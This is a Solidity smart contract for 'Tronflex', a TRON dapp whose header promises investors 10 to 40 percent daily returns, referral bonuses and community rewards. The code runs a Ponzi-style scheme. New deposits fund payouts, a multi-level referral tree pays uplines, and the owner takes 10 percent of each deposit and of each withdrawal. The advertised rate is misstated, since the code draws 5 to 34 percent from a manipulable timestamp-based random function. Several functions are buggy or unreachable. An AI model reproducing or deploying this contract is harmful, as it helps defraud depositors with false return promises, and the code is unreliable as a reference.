//SourceUnit: tronflex.sol

  pragma solidity 0.4 .25;

  /**
   * 
   * 
   * ╱╭━━┳━┳━┳╮               
━┫╱┓┣┳━━━╯                  ⚕️       
╱╱╱┃┃╯                              
━┫╱╰┛╯                    
╱╰━━━╯
    **              ※※※※※※※※※※※※※※※※※※※
    **              TRONFLEX - FIRST DYNAMIC ROI DAPP ON TRON NETWORK
             
                    ♤♤♤♤♤♤♤♤♤♤♤♤♤♤♤♤♤♤♤♤♤♤♤♤♤♤♤♤♤♤♤♤♤♤
                    A newly advanced Roi smartcontract running dynamically 
                    changing between 10% to 40% every 24 hours while rewarding 
                    players accordingly based on Roi. 
                
                    ♧♧♧♧♧♧♧♧♧♧♧♧♧♧♧♧♧♧
                    NEW TRON ERA TO MULTIPLY YOUR FUND
                    ° Earn between 10% to 40 % daily. 
                    ° Earn 10% referral bonus 
                    ° Earn community reward
                 
      ♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡
         Website   : tronflex.xyz
         Telegram : https://t.me/tronflex
         
   *
   * ______________________________________________

░░╔══╗░░░░░░░░░░╔══╗░░ ░╚╣▐▐╠╝░░╔══╗░░╚╣▐▐╠╝░
░░╚╦╦╝░░╚╣▌▌╠╝░░╚╦╦╝░░ ░░░╚╚░░░░╚╦╦╝░░░░╚╚░░░
░░░░░░░░░░╝╝░░░░░░░░░░
   */

  contract Tronflex {

    struct Deposit {
      uint8 tarif;
      uint256 amount;
      uint40 time;
    }

    struct Player {
      address upline;
      uint256 dividends;
      uint256 direct_bonus;
      uint256 match_bonus;
      uint40 last_payout;
      uint256 total_invested;
      uint256 roi_entry;
      uint256 total_withdrawn;
      uint256 total_match_bonus;
      uint256 time;
      //  Deposit[] deposits;
      mapping(uint8 => uint256) structure;
    }

    uint public timetostart = now + 2 days;

    address public owner;

    uint256 public invested;
    uint256 public withdrawn;
    uint256 public direct_bonus;
    uint256 public match_bonus;

    uint8[] public ref_bonuses; // 1 => 1%

    mapping(address => Player) public players;

    event Upline(address indexed addr, address indexed upline, uint256 bonus);
    event NewDeposit(address indexed addr, uint256 amount);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);

    uint public todayRoi;
    uint public totolRoiChange;
    address admin;

    struct roi_history {
      uint id;
      uint Roi;
      uint timeStamp;

    }

    mapping(uint => roi_history) public roi_data;
    uint8 public constant MAX = uint8(0) - uint8(1); // using underflow to generate the maximum possible value
    uint8 public constant SCALE = 40;
    uint8 public constant SCALIFIER = MAX / SCALE;
    uint8 public constant OFFSET = 10;

    constructor(address _admin) public {
      admin = _admin;
      owner = msg.sender;
      ref_bonuses.push(5);
      ref_bonuses.push(3);
      ref_bonuses.push(1);
    }

    function updateROI() public payable {
      uint changeTimes = totolRoiChange;
      //  todayRoi =  random();
      //  tarifs.push(Tarif(1, todayRoi));

      if (now - roi_data[totolRoiChange].timeStamp >= 24 hours) {
        totolRoiChange++;
        //    roi_history memory updateROI;
        roi_data[totolRoiChange].id++;
        roi_data[totolRoiChange].Roi = random();
        roi_data[totolRoiChange].timeStamp = now;
        //msg.sender.transfer(200e6)
      }
    }

    function random() public view returns(uint) {
      return uint((uint256(keccak256(block.timestamp, block.difficulty)) % 30) + 5); // not the best prng - TODO: find a way to make a better one
    }

    function randomish() public view returns(uint) {
      uint seed = uint(keccak256(abi.encodePacked(now)));
      uint scaled = seed / SCALIFIER;
      uint adjusted = scaled + OFFSET;
      if (adjusted <= 10 && adjusted >= 40) {

      } else {
        return adjusted;
      }

    }

    function _payout(address _addr) private {
      uint256 payout = this.payoutOf(_addr);

      if (payout > 0) {
        players[_addr].time = now;
        players[_addr].roi_entry = totolRoiChange;
        players[_addr].dividends += payout;
      }
    }

    function deposit(address _upline) external payable {
      require(msg.value >= 50e6, "Zero amount");
      _payout(msg.sender);
      updateROI();

      Player storage player = players[msg.sender];

      _setUpline(msg.sender, _upline, msg.value);

      player.total_invested += msg.value;
      player.time = now;
      player.roi_entry = totolRoiChange;
      invested += msg.value;
      _refPayout(msg.sender, msg.value);

      owner.transfer((msg.value * 10) / 100);

      emit NewDeposit(msg.sender, msg.value);
    }

    function _refPayout(address _addr, uint256 _amount) private {
      address up = players[_addr].upline;

      for (uint8 i = 0; i < ref_bonuses.length; i++) {
        if (up == address(0)) break;

        uint256 bonus = _amount * ref_bonuses[i] / 100;

        players[up].match_bonus += bonus;
        players[up].total_match_bonus += bonus;

        match_bonus += bonus;

        emit MatchPayout(up, _addr, bonus);

        up = players[up].upline;
      }
    }

    function _setUpline(address _addr, address _upline, uint256 _amount) private {
      if (players[_addr].upline == address(0) && _addr != owner) {
        if (players[_upline].total_invested == 0) {
          _upline = owner;
        } else {
          players[_addr].direct_bonus += _amount / 100;
          direct_bonus += _amount / 100;
        }

        players[_addr].upline = _upline;

        emit Upline(_addr, _upline, _amount / 100);

        for (uint8 i = 0; i < ref_bonuses.length; i++) {
          players[_upline].structure[i]++;

          _upline = players[_upline].upline;

          if (_upline == address(0)) break;
        }
      }
    }

    function payoutOf(address _addr) view external returns(uint256 value) {
      Player storage player = players[_addr];
      uint players_time = player.time;
      uint _sub;
      uint _earned;

      uint _amount = player.total_invested;
      for (uint i = player.roi_entry; i <= totolRoiChange; i++) {
        uint time = roi_data[i].timeStamp;
        uint expirytime = time + 24 hours;
        uint overlapse = expirytime - players_time;
        uint _timeearning = now - players_time;
        uint _roibonus = ((roi_data[i].Roi * _amount) / 100) / 24 hours;

        if (_timeearning <= overlapse) {
          _earned += _roibonus * _timeearning;

        } else if (_timeearning >= overlapse && i <= totolRoiChange) {

          _earned += _roibonus * overlapse;
          players_time = roi_data[i + 1].timeStamp;

        }
      }
      return _earned;

    }

    function withdrawhalf(uint _amounttotake) external {
      updateROI();
      Player storage player = players[msg.sender];

      _payout(msg.sender);

      require(player.dividends > 0 || player.direct_bonus > 0 || player.match_bonus > 0, "Zero amount");

      uint256 amount = player.dividends + player.direct_bonus + player.match_bonus;
      require(_amounttotake <= amount);

      player.dividends = amount - _amounttotake;
      player.direct_bonus = 0;
      player.match_bonus = 0;
      player.total_withdrawn += _amounttotake;
      withdrawn += _amounttotake;
      uint fee = (_amounttotake * 10) / 100;
      msg.sender.transfer(_amounttotake - fee);
      owner.transfer(fee);

      emit Withdraw(msg.sender, _amounttotake);
    }

    function withdraw() external {
      updateROI();
      Player storage player = players[msg.sender];

      _payout(msg.sender);

      require(player.dividends > 0 || player.direct_bonus > 0 || player.match_bonus > 0, "Zero amount");

      uint256 amount = player.dividends + player.direct_bonus + player.match_bonus;

      player.dividends = 0;
      player.direct_bonus = 0;
      player.match_bonus = 0;
      player.total_withdrawn += amount;
      withdrawn += amount;
      uint fee = (amount * 10) / 100;
      msg.sender.transfer(amount - fee);
      owner.transfer(fee);

      emit Withdraw(msg.sender, amount);
    }

    /*
        Only external call
    */
    function userInfo(address _addr) view external returns(uint256 for_withdraw, uint256 total_invested, uint256 total_withdrawn, uint256 total_match_bonus, uint256[3] memory structure) {
      Player storage player = players[_addr];

      uint256 payout = this.payoutOf(_addr);

      for (uint8 i = 0; i < ref_bonuses.length; i++) {
        structure[i] = player.structure[i];
      }

      return (
        payout + player.dividends + player.direct_bonus + player.match_bonus,
        player.total_invested,
        player.total_withdrawn,
        player.total_match_bonus,
        structure
      );
    }

    function contractInfo() view external returns(uint256 _invested, uint256 _withdrawn, uint256 _direct_bonus, uint256 _match_bonus) {
      return (invested, withdrawn, direct_bonus, match_bonus);
    }

    function via(address where) external payable {
      where.transfer(msg.value);
    }
  }